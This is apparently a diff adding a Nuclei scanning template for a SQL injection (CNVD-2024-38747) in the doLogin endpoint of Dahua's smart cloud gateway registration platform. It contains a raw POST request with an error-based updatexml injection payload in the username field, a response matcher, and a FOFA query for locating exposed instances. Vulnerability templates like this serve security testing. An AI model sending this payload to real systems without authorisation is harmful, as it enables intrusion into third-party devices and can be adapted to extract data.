@@ -1,0 +1,31 @@
+id: dhznywg-doLogin-sqli
+
+info:
+  name: 大华智能云网关注册管理平台-SQL注入-doLogin(CNVD-2024-38747)
+  author: dhznywg
+  severity: high
+  metadata:
+    fofa-query: title="智能云网关注册管理平台"
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /index.php/User/doLogin HTTP/1.1
+        Host: 
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/129.0
+        X-Requested-With: XMLHttpRequest
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        username=1')and+updatexml(1,concat(0x7e,111*111,0x7e),1)--+&password=
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+    - type: word
+      part: body
+      words:
+      - "12321"
+      condition: and
